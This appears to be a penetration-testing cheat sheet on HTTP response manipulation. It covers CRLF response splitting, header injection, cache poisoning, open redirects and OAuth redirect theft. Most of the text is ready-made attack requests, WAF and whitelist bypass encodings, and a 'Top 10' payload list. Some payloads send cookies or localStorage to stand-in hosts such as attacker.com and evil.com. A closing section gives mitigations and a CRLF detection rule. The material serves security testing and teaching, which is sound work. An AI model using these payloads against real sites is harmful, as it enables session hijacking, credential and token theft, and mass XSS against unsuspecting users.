## 1. Overview

**What is Response Manipulation?**

Response manipulation vulnerabilities occur when an attacker can modify or control the HTTP response sent by a server to alter application behavior, inject malicious content, or exploit client-side processing. This class of vulnerabilities exploits weaknesses in how applications construct, validate, and transmit HTTP responses.

**Core Concepts:**

- **HTTP Response Splitting:** Injecting CRLF characters (`\r\n`) to add malicious headers or content
- **Header Injection:** Manipulating HTTP headers to redirect users, set malicious cookies, or bypass security controls
- **Content Injection:** Altering response body content to deliver XSS, phishing, or misleading information
- **Cache Poisoning:** Manipulating responses to corrupt shared caches with malicious content

**Why It Matters:** Response manipulation can lead to XSS attacks, session hijacking, cache poisoning, open redirects, and complete compromise of client-side security controls. It bridges server-side vulnerabilities with client-side exploitation.

---

## 2. Exploitation Methods

### 2.1 HTTP Response Splitting

**Attack Vector:** Inject CRLF sequences to split HTTP response and inject arbitrary headers/content

**Testing Checklist:**

- [ ] Identify user-controllable input reflected in response headers
- [ ] Test CRLF injection points (`\r\n`, `%0d%0a`, URL-encoded variants)
- [ ] Verify ability to inject new headers
- [ ] Attempt to inject response body content

**Step-by-Step Exploitation:**

1. **Locate Injection Point**
    
    ```
    Target parameters that appear in:
    - Location headers (redirects)
    - Set-Cookie headers
    - Custom response headers
    - Any server-generated header values
    ```
    
2. **Test Basic CRLF Injection**
    
    ```
    GET /redirect?url=https://evil.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
    ```
    
3. **Inject Malicious Headers**
    
    ```
    Parameter: language=en%0d%0aSet-Cookie:%20admin=true
    Result: Injects new Set-Cookie header
    ```
    
4. **Full Response Injection**
    
    ```
    url=page.html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><body><h1>Fake Page</h1></body></html>
    ```
    

### 2.2 Header Injection

**Attack Vector:** Inject or manipulate HTTP headers without full response splitting

**Testing Checklist:**

- [ ] Test newline characters in header values
- [ ] Attempt multiple header injection
- [ ] Check for header overwrite capabilities
- [ ] Verify impact on security headers (CORS, CSP, etc.)

**Exploitation Steps:**

1. **Cookie Injection**
    
    ```
    GET /setlang?lang=en%0ASet-Cookie:%20sessionid=attackertoken
    ```
    
2. **Location Header Manipulation**
    
    ```
    POST /login
    redirect=/dashboard%0ALocation:%20https://evil.com/phish
    ```
    
3. **Security Header Bypass**
    
    ```
    page=home%0AX-Frame-Options:%20ALLOW
    ```
    

### 2.3 Cache Poisoning via Response Manipulation

**Attack Vector:** Manipulate responses to poison shared caches (CDN, proxy, browser)

**Testing Checklist:**

- [ ] Identify cacheable endpoints with user input
- [ ] Test unkeyed parameters (headers, cookies not in cache key)
- [ ] Inject malicious content into cached response
- [ ] Verify cache storage and retrieval

**Exploitation Steps:**

1. **Identify Cache Behavior**
    
    ```
    GET /api/data?callback=parseData
    Check Cache-Control, Age, X-Cache headers
    ```
    
2. **Poison Cache with XSS**
    
    ```
    GET /api/data?callback=<script>alert(1)</script>
    If cached, subsequent users receive malicious response
    ```
    
3. **Header-Based Cache Poisoning**
    
    ```
    GET /page.html HTTP/1.1
    X-Forwarded-Host: evil.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a<script>/*
    ```
    

### 2.4 Open Redirect via Response Manipulation

**Attack Vector:** Manipulate redirect responses to phishing domains

**Testing Checklist:**

- [ ] Find redirect parameters
- [ ] Test absolute URL injection
- [ ] Bypass whitelist filters
- [ ] Chain with header injection

**Exploitation Steps:**

1. **Basic Redirect Injection**
    
    ```
    GET /redirect?url=https://evil.com
    ```
    
2. **Header Injection Combined**
    
    ```
    GET /redirect?url=safe.com%0ALocation:%20https://evil.com
    ```
    

---

## 3. Bypasses

### 3.1 CRLF Encoding Bypasses

**Challenge:** Applications filter `\r\n` sequences

**Bypass Techniques:**

```
%0d%0a          → URL encoded
%0D%0A          → Upper case variant
\r\n            → Direct characters
%E5%98%8A%E5%98%8D → UTF-8 overlong encoding
\u000d\u000a    → Unicode representation
%C0%8D%C0%8A    → UTF-7 encoding
%250d%250a      → Double URL encoding
```

**Pro Tip:** Try mixed encoding: `%0d\n` or `\r%0a`

### 3.2 Filter Evasion

**Challenge:** WAF/filters block common patterns

**Bypass Strategies:**

1. **Whitespace Manipulation**
    
    ```
    %0d%20%0a       → Space between CR and LF
    %0d%09%0a       → Tab character
    %0d%0a%20       → Leading space on new header
    ```
    
2. **Case Variation**
    
    ```
    set-cookie:     → Lowercase
    Set-Cookie:     → Standard case
    SET-COOKIE:     → Uppercase
    sEt-CoOkIe:     → Mixed case
    ```
    
3. **Header Folding (Obsolete but worth testing)**
    
    ```
    Set-Cookie: admin=true%0d%0a%20continued=value
    ```
    

### 3.3 Whitelist Bypasses

**Challenge:** Application validates redirect domains

**Bypass Techniques:**

```
https://trusted.com@evil.com                    → Username in URL
https://evil.com#trusted.com                    → Fragment
https://evil.com?trusted.com                    → Query string
https://evil.com/trusted.com                    → Path
https://trusted.com.evil.com                    → Subdomain
https://trusted.com%0d%0aLocation:%20evil.com   → Header injection
```

### 3.4 Content-Type Manipulation

**Challenge:** Exploit MIME confusion

**Bypass:**

```
Content-Type: text/html%0d%0aX-Content-Type-Options:%20nosniff%0d%0aContent-Type:%20text/javascript

Forces browser to misinterpret content type
```

---

## 4. Payloads

### Top 10 Modern Response Manipulation Payloads

**1. XSS via Cache Poisoning**

```
GET /api/v1/data?callback=</script><script>fetch('//attacker.com?c='+document.cookie)</script><script>
```

**2. Session Fixation via Cookie Injection**

```
GET /setlang?lang=en%0d%0aSet-Cookie:%20PHPSESSID=attacker_controlled_session;%20Path=/;%20HttpOnly
```

**3. Full Response Splitting with XSS**

```
GET /redirect?url=safe.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
```

**4. Open Redirect with Header Injection**

```
POST /login
redirect=/dashboard%0d%0aLocation:%20https://attacker.com/phish%0d%0aContent-Type:%20text/html%0d%0a%0d%0a
```

**5. CSP Bypass via Header Injection**

```
GET /page?theme=dark%0d%0aContent-Security-Policy:%20default-src%20*%20'unsafe-inline'%20'unsafe-eval'
```

**6. CORS Header Poisoning**

```
GET /api/sensitive HTTP/1.1
Origin: https://trusted.com%0d%0aAccess-Control-Allow-Origin:%20https://evil.com%0d%0aAccess-Control-Allow-Credentials:%20true
```

**7. Double Response Injection**

```
GET /search?q=test%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(origin)</script>
```

**8. Header Injection with UTF-8 Bypass**

```
GET /profile?name=John%E5%98%8A%E5%98%8DSet-Cookie:%20admin=true
```

**9. Cache Deception via Header Manipulation**

```
GET /account/settings HTTP/1.1
X-Original-URL: /static/cached.js%0d%0aContent-Type:%20application/javascript
```

**10. JSON Hijacking via Callback Injection**

```
GET /api/user.json?callback=alert(JSON.stringify(arguments[0]));//
```

---

## 5. Higher Impact Scenarios

### 5.1 Session Hijacking Chain

**Impact:** Full account takeover

**Attack Path:**

1. Inject malicious cookie via CRLF
2. Set attacker-controlled session ID
3. Victim authenticates with fixed session
4. Attacker accesses account with known session

**Exploitation:**

```
GET /welcome?redirect=/home%0d%0aSet-Cookie:%20sessionid=ATTACKER_KNOWN_TOKEN;%20Path=/;%20Secure;%20HttpOnly

Victim visits URL → Session fixed → Victim logs in → Attacker uses same session
```

### 5.2 Persistent Cache Poisoning

**Impact:** Large-scale XSS affecting all users

**Attack Path:**

1. Identify cacheable endpoint with unkeyed parameter
2. Inject XSS payload into response
3. Cache stores poisoned response
4. All subsequent users receive malicious content

**Exploitation:**

```
GET /assets/app.js?version=1.0&utm_source=<script>eval(atob('malicious'))</script>
Cache-Control: public, max-age=31536000

CDN caches response → Millions of users compromised
```

### 5.3 OAuth Token Theft

**Impact:** Complete OAuth flow compromise

**Attack Path:**

1. Manipulate OAuth redirect_uri via header injection
2. Victim completes OAuth flow
3. Authorization code sent to attacker domain
4. Attacker exchanges code for access token

**Exploitation:**

```
GET /oauth/authorize?redirect_uri=https://trusted.com%0d%0aLocation:%20https://attacker.com/steal

OAuth provider redirects to attacker → Token stolen
```

### 5.4 Web Cache Deception

**Impact:** Exposure of sensitive user data

**Attack Path:**

1. Trick cache into storing authenticated user page
2. Victim visits crafted URL
3. Sensitive page cached as public resource
4. Attacker retrieves cached sensitive data

**Exploitation:**

```
GET /account/balance.php/style.css
Cache interprets as static CSS → Stores authenticated response → Attacker fetches cached data
```

### 5.5 Multi-User XSS via API Poisoning

**Impact:** Stored XSS affecting API consumers

**Attack Path:**

1. Poison API response via response manipulation
2. Mobile apps/web clients consume poisoned API
3. XSS executes in all client contexts

**Exploitation:**

```
GET /api/v2/news?format=json&callback=<img src=x onerror=fetch('//evil.com?data='+btoa(localStorage))>
All apps parsing this API execute payload
```

---

## 6. Mitigations

### 6.1 Input Validation & Sanitization

**Implementation Checklist:**

- [ ] Validate all user input before using in headers
- [ ] Block CRLF characters (`\r`, `\n`, `%0d`, `%0a`)
- [ ] Use strict whitelist validation for redirects
- [ ] Encode special characters in header values

**Code Example (Secure Redirect):**

```python
# Python/Flask
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['trusted.com', 'app.trusted.com']

def safe_redirect(url):
    parsed = urlparse(url)
    if parsed.netloc not in ALLOWED_DOMAINS:
        return redirect('/error')
    # Use framework's redirect function (handles encoding)
    return redirect(url)
```

### 6.2 Use Framework Security Functions

**Best Practices:**

- ✅ Use built-in header-setting functions (never manual string concatenation)
- ✅ Leverage framework redirect methods
- ✅ Let framework handle response encoding

**Examples:**

```javascript
// Node.js/Express - SECURE
res.setHeader('X-Custom-Header', userInput); // Framework sanitizes

// INSECURE - DON'T DO THIS
res.writeHead(200, {'X-Custom-Header': userInput}); // Raw header injection risk
```

```php
// PHP - SECURE
header('Location: ' . filter_var($url, FILTER_SANITIZE_URL));

// INSECURE
header('Location: ' . $_GET['url']);
```

### 6.3 Response Header Security

**Configuration Checklist:**

- [ ] Set `X-Content-Type-Options: nosniff`
- [ ] Implement strict CSP
- [ ] Configure `X-Frame-Options: DENY`
- [ ] Enable `Strict-Transport-Security`

**Apache Configuration:**

```apache
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'"
Header always set X-Frame-Options "DENY"
```

**Nginx Configuration:**

```nginx
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header X-Frame-Options "DENY" always;
```

### 6.4 Cache Security

**Protection Strategy:**

1. **Cache-Control Headers**
    
    ```
    Cache-Control: private, no-cache, no-store, must-revalidate
    Pragma: no-cache
    Expires: 0
    ```
    
2. **Include All Variables in Cache Key**
    
    ```
    Cache key should include:
    - URL parameters
    - Relevant headers (Host, Accept-Language)
    - Authentication state
    ```
    
3. **Vary Header Usage**
    
    ```
    Vary: Accept-Encoding, User-Agent, Cookie
    ```
    

### 6.5 Security Testing

**Testing Checklist:**

- [ ] Scan for CRLF injection in all header-reflected parameters
- [ ] Test redirect parameter validation
- [ ] Verify cache behavior with malicious input
- [ ] Check custom header handling
- [ ] Audit API response construction

**Automated Testing Tools:**

- OWASP ZAP (Response Splitting scan)
- Burp Suite (Header injection checks)
- w3af (CRLF injection module)

### 6.6 Web Application Firewall (WAF)

**Detection Rules:**

- Block `%0d%0a`, `\r\n` in user input
- Alert on multiple `Location:` headers
- Flag suspicious header patterns
- Monitor cache hit rates for anomalies

**ModSecurity Rule Example:**

```
SecRule ARGS "@contains \r\n" "id:1,deny,status:403,msg:'CRLF Injection Attempt'"
```

---

**🎯 Key Takeaway:** Response manipulation vulnerabilities are powerful but preventable. Focus on strict input validation, use framework security features, and implement defense-in-depth with proper header security. Stay curious and keep testing! 🚀